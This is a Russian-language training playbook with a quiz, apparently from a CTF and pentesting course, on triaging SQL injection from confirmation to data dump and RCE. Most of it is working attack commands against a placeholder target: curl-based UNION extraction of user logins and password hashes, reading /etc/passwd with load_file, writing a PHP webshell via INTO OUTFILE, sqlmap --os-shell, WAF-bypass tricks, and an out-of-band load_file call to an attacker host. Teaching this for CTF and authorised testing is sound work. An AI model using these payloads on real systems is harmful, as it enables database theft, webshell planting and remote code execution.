---
id: web-playbook-injection-triage
title: "Плейбук: триаж инъекции — от подозрения до дампа и RCE"
category: web
parent: web-playbooks-recon
difficulty: hard
order: 2
tags: [playbook, sqli, injection, triage, union, blind, oob, decision-tree, web]
prerequisites: [web-sqli, web-playbook-recon-to-foothold, web-tool-sqlmap]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 38
summary: "Decision-tree для возможной инъекции: подтвердить → определить СУБД → выбрать технику (union/error/blind/OOB) → извлечь данные → эскалировать до файлов и RCE."
---

## Задача

Ты заметил признак инъекции на `https://target.tld/item?id=1`: одиночная кавычка дала ошибку, ответ изменился на `AND 1=1`, страница «зависла» на время. Дальше — самый частый ступор: **это точно SQLi? какая СУБД? какую технику брать? и как из «нашёл» получить дамп или код?**

Этот плейбук — дерево решений для всех инъекций (SQL/NoSQL/LDAP/XPath). На каждом узле — конкретная команда и условие перехода.

## Данные, с которыми работаем

Параметр `id` на `https://target.tld/item`. Пройдём: confirm → fingerprint → техника → extract → escalate.

## Дерево решения

```
[признак инъекции]
   ├─(1) CONFIRM: воспроизвести детерминированно (не один раз!)
   │      ├─ ошибка СУБД ──────────► error-based
   │      ├─ AND 1=1 / 1=2 различаются ─► boolean
   │      ├─ задержка от SLEEP ──────► time-based
   │      └─ ничего не видно ────────► OOB
   ├─(2) FINGERPRINT: MySQL / PostgreSQL / MSSQL / Oracle / SQLite
   ├─(3) ТЕХНИКА: union / error / boolean / time / OOB
   ├─(4) EXTRACT: версия → БД → таблицы → колонки → данные
   └─(5) ESCALATE: файл-чтение/запись → RCE  ──► [данные / код]
```

## Шаг 1: confirm — воспроизвести детерминированно

Одна ошибка на один запрос ничего не значит — может быть шум. Нужна **воспроизводимость**:

```bash
$ curl -s -o /dev/null -w 'size=%{size_download}\n' --get --data-urlencode 'id=1' https://target.tld/item
size=4821
$ curl -s -o /dev/null -w 'TRUE  size=%{size_download}\n' --get --data-urlencode "id=1 AND 1=1" https://target.tld/item
TRUE  size=4821
$ curl -s -o /dev/null -w 'FALSE size=%{size_download}\n' --get --data-urlencode "id=1 AND 1=2" https://target.tld/item
FALSE size=0
```

`AND 1=1` и `AND 1=2` дают **стабильно разный** ответ — boolean-инъекция подтверждена.

**Про контекст:** инъекция в JSON (`{"id":1}`), cookie, заголовке или multipart ведёт себя иначе, чем в query. Сначала определи, где именно ты вставляешь значение.

## Шаг 2: fingerprint — какая СУБД

От СУБД зависит всё: синтаксис, функция задержки, чтение файлов и RCE.

```bash
$ curl -s --get --data-urlencode "id=1'" https://target.tld/item | grep -iE 'mysql|postgres|mssql|oracle|sqlite'
You have an error in your SQL syntax; ... near ''1'' at line 1
```

Таблица признаков:

| Признак в ответе | СУБД | Функция задержки |
|------------------|------|------------------|
| `You have an error in your SQL syntax` | MySQL/MariaDB | `SLEEP(n)` |
| `ERROR: syntax error at or near` | PostgreSQL | `pg_sleep(n)` |
| `Unclosed quotation mark after ...` | MSSQL | `WAITFOR DELAY '0:0:5'` |
| `ORA-01756: quoted string ...` | Oracle | `dbms_pipe.receive_message` |
| `SQLite3::...` / `near "...": syntax error` | SQLite | тяжёлый запрос / `randomblob` |

**Условие ветвления:** СУБД известна → бери её профильный урок (`db-mysql`, `db-postgresql`, `db-mssql`…) и технику из шага 3. Неизвестна → `sqlmap --fingerprint`.

## Шаг 3: техника — union / error / boolean / time / OOB

Выбирай **по тому, что реально видишь**, а не по принципу «union круче».

| Техника | Когда брать | Команда-заготовка |
|---------|-------------|-------------------|
| **UNION** | данные запроса выводятся на страницу | `... UNION SELECT 1,2,3-- -` |
| **Error** | ошибки СУБД видны в ответе | `extractvalue(1,concat(0x7e,version()))` |
| **Boolean** | ответ «есть/нет», различается по размеру | `... AND substr(database(),1,1)='a'` |
| **Time** | ответ вообще не меняется | `... AND SLEEP(5)-- -` |
| **OOB** | нет ни данных, ни разницы, ни времени | `load_file('\\\\attacker.tld\\a')` |

```bash
# UNION: сначала число колонок через ORDER BY
$ curl -s --get --data-urlencode "id=1 ORDER BY 4" https://target.tld/item | wc -c
0                       # на 4-й колонке ошибка -> колонок 3
$ curl -s --get --data-urlencode "id=-1 UNION SELECT 1,2,3-- -" https://target.tld/item

# Time-based (MySQL) — надёжный признак вслепую
$ time curl -s -o /dev/null --get --data-urlencode "id=1 AND IF(1=1,SLEEP(5),0)-- -" https://target.tld/item
real    0m5.02s
```

**Условие ветвления:** нашёл рабочую технику → шаг 4. UNION не сработал → пробуй error, затем boolean, затем time. Ничего → OOB или точка неинъекционна.

## Шаг 4: extract — от версии к данным

Порядок всегда один: **версия → текущая БД → таблицы → колонки → строки**. Не пытайся сразу `--dump-all`.

```bash
# Ручной UNION-дамп (MySQL): таблицы текущей БД
$ curl -s --get --data-urlencode \
  "id=-1 UNION SELECT group_concat(table_name),2,3 FROM information_schema.tables WHERE table_schema=database()-- -" \
  https://target.tld/item
users,orders,products

# Строки (логины/хеши)
$ curl -s --get --data-urlencode \
  "id=-1 UNION SELECT group_concat(login,0x3a,password SEPARATOR 0x0a),2,3 FROM users-- -" \
  https://target.tld/item
admin:5f4dcc3b5aa765d61d8327deb882cf99

# Автоматизация
$ sqlmap -u 'https://target.tld/item?id=1' --batch -D appdb -T users -C login,password --dump
```

**Условие ветвления:** получил креды → проверь их на других сервисах и в auth-плейбуке. Получил чувствительные данные → это подтверждённая находка, фиксируй доказательство.

## Шаг 5: escalate — файлы и RCE

Инъекция в БД — это не только данные. Часто она даёт чтение/запись файлов и код.

```bash
# Чтение файла (MySQL, при FILE-привилегии)
$ curl -s --get --data-urlencode "id=-1 UNION SELECT load_file('/etc/passwd'),2,3-- -" https://target.tld/item

# Запись webshell (MySQL: FILE + writable webroot + secure_file_priv='')
$ curl -s --get --data-urlencode \
  "id=-1 UNION SELECT '<?php system(\$_GET[0]); ?>',2,3 INTO OUTFILE '/var/www/html/s.php'-- -" \
  https://target.tld/item
$ curl -s 'https://target.tld/s.php?0=id'

# PostgreSQL: COPY ... TO/FROM PROGRAM = прямой RCE
$ sqlmap -u 'https://target.tld/item?id=1' --batch --os-shell --technique=U
```

**Осторожно:** `INTO OUTFILE`, `COPY ... PROGRAM`, `xp_cmdshell`, `--os-shell` **меняют состояние** цели. На проде сначала согласуй; пиши webshell в отдельный файл, не перезаписывай существующие, не выполняй деструктивных команд.

## Полный прогон от начала до конца

1. `id=1 AND 1=1` vs `1=2` → boolean подтверждён.
2. Ошибка назвала MySQL → fingerprint.
3. `ORDER BY 4` → 3 колонки; `UNION SELECT 1,2,3`.
4. Дамп таблиц → `users` → `admin:5f4dcc...`.
5. `load_file('/etc/passwd')` → чтение файла → эскалация.

## Если не сработало — пробуй это

- **UNION не сходится.** Проверь число колонок (`ORDER BY`), тип (`NULL` вместо числа), комментарий под СУБД (`-- -` vs `#` vs `/* */`).
- **Фильтр режет кавычку/пробел.** `/**/` вместо пробела, `%0a`, `char(39)` вместо `'`, `0x...` вместо строк, регистр `SeLeCt`.
- **Boolean «плывёт».** Динамический контент меняет размер — сравнивай конкретный маркер или переходи на time-based.
- **Time нестабилен.** Сделай несколько замеров, вычти базовую задержку.
- **Всё вслепую.** Попробуй инъекцию в другие поля (cookie, `User-Agent`, `X-Forwarded-For`) — они часто логируются в БД.
- **NoSQL/LDAP/XPath.** Признак: JSON-параметр или `filter=(...)`. Пробуй `{"$ne":null}`, `*)(|(cn=*`.

## Тупики

- `sqlmap --dump-all --level 5 --risk 3` с ходу — долго, шумно, ломает сессию.
- «UNION не сработал = нет SQLi» — boolean/time/OOB остаются.
- Игнорировать другой контекст (заголовок/логи) — там инъекция может быть.
- `INTO OUTFILE` в существующий файл или без `secure_file_priv` — ничего не запишется.
- Трактовать «задержку» как time-based без контроля — сеть и GC тоже дают задержку.

## Что мы теперь знаем

- Инъекция подтверждается **детерминированно**, а не одним запросом.
- СУБД определяется по тексту ошибки; от неё зависит всё.
- Технику выбирают по тому, что видно: union → error → boolean → time → OOB.
- Порядок извлечения: версия → БД → таблицы → колонки → данные.
- Инъекция в БД может эскалировать до чтения файлов и RCE.

## На что смотреть дальше

- **Права СУБД.** `load_file`/`INTO OUTFILE` требуют FILE; `xp_cmdshell` — `sysadmin`.
- **Не деструктивно.** Webshell в отдельный файл; никаких `DROP`/`rm`.
- **Параметризованные запросы.** Понимание триажа объясняет, почему prepared statements закрывают класс.
- **Другой контекст.** Один и тот же ввод в JSON/cookie/заголовке ведёт себя иначе.
- **OOB-канал.** Collaborator/interactsh для слепых точек без времени.

## Справочник: как отличить СУБД по реакции

От платформы зависят и синтаксис комментария, и функция задержки, и способ чтения файла. Быстрая шпаргалка, которую стоит держать под рукой на этапе fingerprint:

| СУБД | Комментарий | Конкатенация | Задержка | Версия | Чтение файла |
|---|---|---|---|---|---|
| MySQL/MariaDB | `-- -`, `#`, `/**/` | `CONCAT()`, `||` (режим PIPES) | `SLEEP(n)` | `@@version` | `LOAD_FILE()` |
| PostgreSQL | `--`, `/* */` | `\|\|` | `pg_sleep(n)` | `version()` | `pg_read_file()` |
| MSSQL | `--`, `/* */` | `+` | `WAITFOR DELAY '0:0:n'` | `@@version` | `OPENROWSET`/`xp_cmdshell` |
| Oracle | `--`, `/* */` | `\|\|` | `dbms_pipe.receive_message` | `v$version` | `UTL_FILE` |
| SQLite | `--`, `/* */` | `\|\|` | `randomblob` (тяжёлый) | `sqlite_version()` | `readfile()` (CLI) |

Мнемоника: если ошибка ругается на `SLEEP` — это MySQL; если принимает `pg_sleep` — PostgreSQL; если синтаксис требует `WAITFOR` — MSSQL. Первый же отличимый признак сужает дальнейший перебор в разы.

## Ограничения и краевые случаи

- **Контекст ввода важнее синтаксиса.** Один и тот же `'` внутри числового поля, строки и `ORDER BY` ведёт себя по-разному: в числовом контексте кавычка не нужна, а в `ORDER BY` инъекция ограничена.
- **Права решают исход.** `LOAD_FILE`/`INTO OUTFILE` требуют привилегии `FILE` и непустого `secure_file_priv`; `xp_cmdshell` — роли `sysadmin`. Без них эскалация обрывается на чтении данных.
- **WAF меняет «буквы», не смысл.** Обход пробелов и кавычек — это про синтаксис; если WAF блокирует сам оператор `UNION`, поможет boolean/time, а не `/**/`.
- **Вторичный контекст.** Инъекция может жить не в видимом параметре, а в cookie, `User-Agent` или `X-Forwarded-For`, которые приложение пишет в лог-таблицу. Не найдя её в URL, проверь заголовки.
- **Не только SQL.** Если параметр — JSON или выражение вроде `filter=(...)`, речь может идти о NoSQL/LDAP/XPath: там свои операторы (`$ne`, `$where`, `*)(cn=*`) и своя логика.

## Квиз

Проверь себя.

```quiz
- question: "Ответ на id=1 AND 1=1 и id=1 AND 1=2 отличается стабильно. Что это за техника?"
  options:
    - "UNION-based"
    - "Boolean-based blind"
    - "Error-based"
    - "Out-of-band"
  answer: 1
  explanation: "Разница между истинным и ложным условием без вывода данных — это boolean-based blind."
- question: "Какая функция задержки у PostgreSQL?"
  options:
    - "SLEEP(n)"
    - "WAITFOR DELAY"
    - "pg_sleep(n)"
    - "dbms_pipe.receive_message"
  answer: 2
  explanation: "У PostgreSQL задержку даёт pg_sleep; SLEEP — MySQL, WAITFOR — MSSQL."
- question: "Что делают ПЕРЕД UNION-дампом?"
  options:
    - "Сразу --dump-all"
    - "Определяют число колонок (ORDER BY) и печатающуюся колонку"
    - "Меняют User-Agent"
    - "Пишут webshell"
  answer: 1
  explanation: "UNION требует совпадения числа и типов колонок — их определяют заранее."
- question: "UNION не сработал, ошибок нет, размер ответа не меняется. Что дальше?"
  options:
    - "Признать, что инъекции нет"
    - "Попробовать time-based и OOB"
    - "Запустить XSS-сканер"
    - "Сменить браузер"
  answer: 1
  explanation: "Слепые точки раскрываются через time-based или out-of-band каналы."
- question: "Что нужно, чтобы MySQL записал webshell через INTO OUTFILE?"
  options:
    - "Только кавычка"
    - "Привилегия FILE, writable webroot и незанятый файл (secure_file_priv пуст)"
    - "Только UNION"
    - "Только Windows"
  answer: 1
  explanation: "Запись файла требует FILE-привилегии, права писать в webroot и отсутствия файла-цели."
```

## Куда дальше

Дальше (`web-playbooks-exploit`) мы разберём плейбуки эксплуатации: доступ, файлы и SSRF. А пока главное запомни: триаж — это дерево, где техника выбирается по тому, что ты видишь, а не по принципу «union круче».

## Где пригодится

- **CTF (Web):** быстрый выбор техники и переход к дампу под таймером.
- **Bug bounty:** структурированное подтверждение инъекции без ложных отчётов.
- **Пентест:** от подозрения к данным и RCE с доказательствами на каждом шаге.
- **Работа (AppSec):** понимание, почему параметризованные запросы и минимальные привилегии БД критичны.
